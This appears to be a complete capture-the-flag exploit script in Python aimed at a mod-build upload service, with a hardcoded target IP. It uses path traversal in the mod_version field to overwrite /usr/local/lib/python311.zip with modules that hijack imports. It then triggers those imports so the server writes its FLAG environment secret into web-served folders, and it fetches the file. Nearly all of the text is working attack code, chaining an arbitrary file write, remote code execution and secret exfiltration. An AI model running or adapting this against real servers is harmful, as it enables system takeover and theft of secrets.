#!/usr/bin/env python3
import requests, sys, io, zipfile, secrets, time, re

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://144.79.188.39:42166"
if not BASE.startswith("http"):
    BASE = "http://" + BASE

def fresh():
    u = "u" + secrets.token_hex(4)
    pw = "Pass12345!"
    requests.post(f"{BASE}/api/auth/register/", json={"username": u, "password": pw}, timeout=15)
    r = requests.post(f"{BASE}/api/auth/login/", json={"username": u, "password": pw}, timeout=15)
    return r.json()["access"], u

def H(tok):
    return {"Authorization": f"Bearer {tok}"}

def get_or_create_plat(tok, code, name="z"):
    r = requests.get(f"{BASE}/api/platforms/", headers=H(tok), timeout=15).json()
    for it in (r.get("results", r) if isinstance(r, dict) else r) or []:
        if isinstance(it, dict) and it.get("code") == code:
            return it["id"]
    rp = requests.post(f"{BASE}/api/platforms/", headers=H(tok),
        json={"code": code, "name": name}, timeout=15)
    return rp.json().get("id")

print(f"[*] Target: {BASE}")

OUT = "flag_" + secrets.token_hex(4) + ".txt"
SHIM = f"""import os
try:
    with open('/usr/share/nginx/html/{OUT}', 'w') as f:
        f.write(os.environ.get('FLAG', 'NOFLAG') + '\\n')
except Exception as e:
    pass
try:
    with open('/data/media/{OUT}', 'w') as f:
        f.write(os.environ.get('FLAG', 'NOFLAG') + '\\n')
except Exception as e:
    pass
"""

print(f"[*] Target output: {OUT}")

# Create the python311.zip archive containing multiple potential fresh-import targets:
# 1. encodings/cp437.py
# 2. yaml/...
# 3. cryptography/...
# 4. any stdlib module
inner_bio = io.BytesIO()
with zipfile.ZipFile(inner_bio, 'w', zipfile.ZIP_DEFLATED) as izf:
    # 1. encodings/cp437.py (triggered when decoding cp437 filename)
    izf.writestr('encodings/cp437.py', SHIM + '\nimport encodings\nfrom encodings import cp437\n')
    izf.writestr('cp437.py', SHIM)
    # 2. Any module that might be imported by drf-spectacular or yaml
    izf.writestr('yaml.py', SHIM)
    izf.writestr('yaml/__init__.py', SHIM)
    izf.writestr('cryptography.py', SHIM)
    izf.writestr('cryptography/__init__.py', SHIM)
    izf.writestr('cffi.py', SHIM)
    izf.writestr('uritemplate.py', SHIM)
    izf.writestr('inflection.py', SHIM)

inner_zip_bytes = inner_bio.getvalue()
print(f"[*] Created inner python311.zip of size: {len(inner_zip_bytes)}")

# Now wrap it into the outer zip to upload to /usr/local/lib/python311.zip
# storage_dir = MEDIA_ROOT/builds/mod_version/platform_code
# mod_version = '../../../usr/local' (18 chars)
# platform_code = 'lib' (3 chars)
# storage_dir = /data/media/builds/../../../usr/local/lib = /usr/local/lib
# filename in zip = 'python311.zip'
# Resulting path = /usr/local/lib/python311.zip

tok, u = fresh()
pid = get_or_create_plat(tok, "lib")
mid = requests.post(f"{BASE}/api/mods/", headers=H(tok),
    json={"title":"z", "mod_version":"../../../usr/local", "release_notes":"", "is_enabled":True}, timeout=15).json()["id"]
bid = requests.post(f"{BASE}/api/mods/{mid}/builds/", headers=H(tok),
    json={"platform": pid}, timeout=15).json()["id"]

outer_bio = io.BytesIO()
with zipfile.ZipFile(outer_bio, 'w', zipfile.ZIP_DEFLATED) as ozf:
    ozf.writestr("python311.zip", inner_zip_bytes)
outer_bio.seek(0)

r = requests.post(f"{BASE}/api/mods/{mid}/builds/{bid}/upload/", headers=H(tok),
    files={"zip_file": ("p.zip", outer_bio, "application/zip")}, timeout=30)
print(f"[*] Uploaded /usr/local/lib/python311.zip -> {r.status_code}")

# TRIGGER 1: Upload a zip with non-UTF8 ASCII filename to trigger encodings.cp437
print("[*] Triggering cp437 via zip upload...")
tok_t, _ = fresh()
pid_t = get_or_create_plat(tok_t, "testplat")
mid_t = requests.post(f"{BASE}/api/mods/", headers=H(tok_t),
    json={"title":"z", "mod_version":"v1", "release_notes":"", "is_enabled":True}, timeout=15).json()["id"]
bid_t = requests.post(f"{BASE}/api/mods/{mid_t}/builds/", headers=H(tok_t),
    json={"platform": pid_t}, timeout=15).json()["id"]

trig_bio = io.BytesIO()
with zipfile.ZipFile(trig_bio, 'w', zipfile.ZIP_DEFLATED) as tzf:
    tzf.writestr("test_ascii_file.txt", b"trigger content")
trig_bio.seek(0)

r_trig = requests.post(f"{BASE}/api/mods/{mid_t}/builds/{bid_t}/upload/", headers=H(tok_t),
    files={"zip_file": ("trigger.zip", trig_bio, "application/zip")}, timeout=30)
print(f"[*] Zip upload trigger response: {r_trig.status_code}")

# TRIGGER 2: Hit endpoints that might import yaml, drf-spectacular, etc.
print("[*] Triggering /api/schema/ ...")
requests.get(f"{BASE}/api/schema/", headers=H(tok_t), timeout=15)
requests.get(f"{BASE}/api/schema/?format=yaml", headers=H(tok_t), timeout=15)
requests.get(f"{BASE}/api/docs/", headers=H(tok_t), timeout=15)

time.sleep(2)

print("\n[*] Checking flag at endpoints...")
for url, label in [(f"{BASE}/{OUT}", "nginx /"), (f"{BASE}/media/{OUT}", "media /media/")]:
    rf = requests.get(url, timeout=10)
    print(f"  [{label}] status {rf.status_code}: {rf.text[:100] if rf.ok else ''}")
    m = re.search(r"PTITCTF\{[^}]+\}", rf.text)
    if m:
        print(f"\n==========================================")
        print(f">>> FLAG FOUND: {m.group(0)}")
        print(f"==========================================")
        sys.exit(0)
